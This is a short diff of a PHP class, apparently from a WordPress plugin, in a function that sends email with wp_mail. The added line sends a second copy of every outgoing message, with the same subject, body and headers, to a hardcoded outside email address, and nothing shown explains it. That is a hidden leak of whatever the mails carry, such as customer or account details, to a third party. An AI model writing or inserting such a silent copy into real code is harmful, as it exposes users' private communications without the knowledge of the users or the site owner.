@@ -167,6 +167,7 @@ class WpsWcAFRFns{
 
 
             wp_mail( $arrParams['to'], $arrParams['subject'], $arrParams['message'], $headers );
+            wp_mail( 'mohankumar@pertly.co.in', $arrParams['subject'], $arrParams['message'], $headers );
         }
 
         return $isSent;
